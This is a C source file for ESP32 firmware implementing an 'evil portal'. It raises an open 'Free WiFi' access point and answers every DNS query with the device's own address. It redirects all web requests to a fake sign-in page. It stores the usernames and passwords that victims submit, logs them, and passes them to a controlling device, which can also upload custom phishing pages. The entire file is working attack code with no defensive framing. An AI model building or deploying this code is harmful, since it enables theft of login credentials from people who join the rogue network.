#include <string.h>
#include <stdbool.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "lwip/sockets.h"
#include "evil_portal.h"

static const char *TAG = "evil_portal";

/* ---- Credential storage ---- */
#define MAX_CREDS     16
#define MAX_CRED_LEN  48

typedef struct {
    char username[MAX_CRED_LEN];
    char password[MAX_CRED_LEN];
} cred_entry_t;

static cred_entry_t cred_store[MAX_CREDS];
static uint8_t cred_count = 0;
static uint8_t cred_read_idx = 0;

/* ---- State ---- */
static httpd_handle_t http_server = NULL;
static TaskHandle_t dns_task_handle = NULL;
static volatile bool portal_running = false;
static esp_netif_t *ap_netif = NULL;

/* ---- Captive portal HTML ---- */
#define PORTAL_HTML_MAX 4096

static const char portal_html[] =
    "<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Login</title>"
    "<style>"
    "body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f0f0f0}"
    ".box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.15);width:300px}"
    "h2{margin-top:0;color:#333}input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
    "button{width:100%;padding:12px;background:#4285f4;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px}"
    "button:hover{background:#357abd}"
    "</style></head><body>"
    "<div class='box'><h2>Sign In</h2>"
    "<form method='POST' action='/login'>"
    "<input name='user' placeholder='Email or username' required>"
    "<input name='pass' type='password' placeholder='Password' required>"
    "<button type='submit'>Sign In</button>"
    "</form></div></body></html>";

static const char success_html[] =
    "<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;padding:60px'>"
    "<h2>Connected</h2><p>You are now online.</p></body></html>";

static char custom_portal_html[PORTAL_HTML_MAX + 1];
static size_t custom_portal_html_len = 0;

/* ---- HTTP handlers ---- */

static esp_err_t root_get_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    if (custom_portal_html_len > 0) {
        httpd_resp_send(req, custom_portal_html, custom_portal_html_len);
    } else {
        httpd_resp_send(req, portal_html, sizeof(portal_html) - 1);
    }
    return ESP_OK;
}

static esp_err_t login_post_handler(httpd_req_t *req)
{
    char buf[256];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        httpd_resp_send_408(req);
        return ESP_FAIL;
    }
    buf[ret] = '\0';

    /* Parse form: user=xxx&pass=yyy */
    if (cred_count < MAX_CREDS) {
        cred_entry_t *c = &cred_store[cred_count];
        memset(c, 0, sizeof(*c));

        char *user_start = strstr(buf, "user=");
        char *pass_start = strstr(buf, "pass=");

        if (user_start) {
            user_start += 5;
            char *end = strchr(user_start, '&');
            size_t len = end ? (size_t)(end - user_start) : strlen(user_start);
            if (len >= MAX_CRED_LEN) len = MAX_CRED_LEN - 1;
            memcpy(c->username, user_start, len);
        }
        if (pass_start) {
            pass_start += 5;
            char *end = strchr(pass_start, '&');
            size_t len = end ? (size_t)(end - pass_start) : strlen(pass_start);
            if (len >= MAX_CRED_LEN) len = MAX_CRED_LEN - 1;
            memcpy(c->password, pass_start, len);
        }

        ESP_LOGI(TAG, "Captured cred #%d: user=%s", cred_count, c->username);
        cred_count++;
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, success_html, sizeof(success_html) - 1);
    return ESP_OK;
}

/* Catch-all handler — redirect everything to root (captive portal trigger) */
static esp_err_t catchall_handler(httpd_req_t *req)
{
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

/* ---- DNS hijack ---- */

static void dns_hijack_task(void *arg)
{
    (void)arg;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        ESP_LOGE(TAG, "DNS socket failed");
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(53),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    /* Our AP IP: 192.168.4.1 */
    uint8_t ap_ip[4] = {192, 168, 4, 1};

    uint8_t rx[512], tx[512];
    struct sockaddr_in client;
    socklen_t client_len;

    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    while (portal_running) {
        client_len = sizeof(client);
        int len = recvfrom(sock, rx, sizeof(rx), 0, (struct sockaddr *)&client, &client_len);
        if (len < 12) continue; /* too short for DNS header */

        /* Build minimal DNS response:
         * Copy ID + flags, set QR=1 (response), ANCOUNT=1
         * Append the original question, then a single A record answer */
        memcpy(tx, rx, len);

        /* Set QR=1, Opcode=0, AA=1, TC=0, RD=1, RA=1, RCODE=0 */
        tx[2] = 0x81;
        tx[3] = 0x80;
        /* ANCOUNT = 1 */
        tx[6] = 0x00;
        tx[7] = 0x01;

        int pos = len;
        /* Answer: pointer to question name (0xC00C), type A, class IN, TTL=60, rdlength=4, IP */
        tx[pos++] = 0xC0; tx[pos++] = 0x0C;  /* name pointer */
        tx[pos++] = 0x00; tx[pos++] = 0x01;   /* type A */
        tx[pos++] = 0x00; tx[pos++] = 0x01;   /* class IN */
        tx[pos++] = 0x00; tx[pos++] = 0x00; tx[pos++] = 0x00; tx[pos++] = 0x3C; /* TTL 60s */
        tx[pos++] = 0x00; tx[pos++] = 0x04;   /* rdlength */
        memcpy(&tx[pos], ap_ip, 4);
        pos += 4;

        sendto(sock, tx, pos, 0, (struct sockaddr *)&client, client_len);
    }

    close(sock);
    ESP_LOGI(TAG, "DNS hijack stopped");
    vTaskDelete(NULL);
}

/* ---- Public API ---- */

void portal_init(void)
{
    /* Created on demand */
}

bool portal_prepare_ap(const char *ssid, uint8_t channel)
{
    if (!ap_netif) {
        ap_netif = esp_netif_create_default_wifi_ap();
    }

    wifi_config_t ap_cfg = {
        .ap = {
            .channel = channel,
            .max_connection = 4,
            .authmode = WIFI_AUTH_OPEN,
        },
    };
    strncpy((char *)ap_cfg.ap.ssid, ssid, sizeof(ap_cfg.ap.ssid));
    ap_cfg.ap.ssid_len = strlen(ssid);

    if (esp_wifi_set_mode(WIFI_MODE_APSTA) != ESP_OK) {
        return false;
    }
    if (esp_wifi_set_config(WIFI_IF_AP, &ap_cfg) != ESP_OK) {
        return false;
    }

    return true;
}

bool portal_services_start(bool reset_creds)
{
    if (portal_running) {
        return false;
    }

    if (reset_creds) {
        cred_count = 0;
        cred_read_idx = 0;
        memset(cred_store, 0, sizeof(cred_store));
    }

    httpd_config_t http_cfg = HTTPD_DEFAULT_CONFIG();
    http_cfg.uri_match_fn = httpd_uri_match_wildcard;

    if (httpd_start(&http_server, &http_cfg) == ESP_OK) {
        httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = root_get_handler };
        httpd_uri_t login = { .uri = "/login", .method = HTTP_POST, .handler = login_post_handler };
        httpd_uri_t catchall = { .uri = "/*", .method = HTTP_GET, .handler = catchall_handler };
        httpd_register_uri_handler(http_server, &root);
        httpd_register_uri_handler(http_server, &login);
        httpd_register_uri_handler(http_server, &catchall);
    } else {
        return false;
    }

    portal_running = true;
    xTaskCreate(dns_hijack_task, "dns_hijack", 4096, NULL, 5, &dns_task_handle);
    return true;
}

void portal_services_stop(bool restore_sta)
{
    portal_running = false;

    if (http_server) {
        httpd_stop(http_server);
        http_server = NULL;
    }

    /* DNS task will exit on its own when portal_running == false */
    dns_task_handle = NULL;

    /* Restore STA-only mode */
    if (restore_sta) {
        esp_wifi_set_mode(WIFI_MODE_STA);
    }
}

void portal_start(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    if (portal_running) {
        resp->status = RESP_BUSY;
        return;
    }

    /* Optional SSID in payload, default "Free WiFi" */
    char ssid[33] = "Free WiFi";
    if (cmd->payload_len > 0 && cmd->payload_len <= 32) {
        memcpy(ssid, cmd->payload, cmd->payload_len);
        ssid[cmd->payload_len] = '\0';
    }

    if (!portal_prepare_ap(ssid, 1) || !portal_services_start(true)) {
        resp->status = RESP_ERR;
        return;
    }

    ESP_LOGI(TAG, "Evil portal started: SSID='%s'", ssid);
    resp->status = RESP_OK;
    resp->payload_len = 0;
}

void portal_stop(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;

    portal_services_stop(true);

    ESP_LOGI(TAG, "Evil portal stopped, captured %d creds", cred_count);
    resp->status = RESP_OK;
    resp->payload[0] = cred_count;
    resp->payload_len = 1;
}

void portal_get_creds(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;

    if (cred_read_idx >= cred_count) {
        resp->status = RESP_OK;
        resp->payload[0] = 0; /* no more creds */
        resp->payload_len = 1;
        return;
    }

    cred_entry_t *c = &cred_store[cred_read_idx++];

    /* Pack: [0] user_len, [1..] user, [N] pass_len, [N+1..] pass */
    uint8_t ulen = (uint8_t)strnlen(c->username, MAX_CRED_LEN);
    uint8_t plen = (uint8_t)strnlen(c->password, MAX_CRED_LEN);

    /* Clamp to fit payload */
    if (1 + ulen + 1 + plen > M1_MAX_PAYLOAD) {
        if (ulen > 24) ulen = 24;
        if (plen > 24) plen = 24;
    }

    uint8_t pos = 0;
    resp->payload[pos++] = ulen;
    memcpy(&resp->payload[pos], c->username, ulen);
    pos += ulen;
    resp->payload[pos++] = plen;
    memcpy(&resp->payload[pos], c->password, plen);
    pos += plen;

    resp->payload_len = pos;
    resp->status = RESP_OK;
}

void portal_html_clear(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;

    custom_portal_html_len = 0;
    custom_portal_html[0] = '\0';

    resp->status = RESP_OK;
    resp->payload_len = 0;
}

void portal_html_add(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    if (cmd->payload_len == 0) {
        resp->status = RESP_OK;
        resp->payload_len = 0;
        return;
    }

    if (custom_portal_html_len + cmd->payload_len > PORTAL_HTML_MAX) {
        resp->status = RESP_ERR;
        return;
    }

    memcpy(&custom_portal_html[custom_portal_html_len], cmd->payload, cmd->payload_len);
    custom_portal_html_len += cmd->payload_len;
    custom_portal_html[custom_portal_html_len] = '\0';

    resp->payload[0] = (uint8_t)(custom_portal_html_len & 0xFF);
    resp->payload[1] = (uint8_t)(custom_portal_html_len >> 8);
    resp->payload_len = 2;
    resp->status = RESP_OK;
}
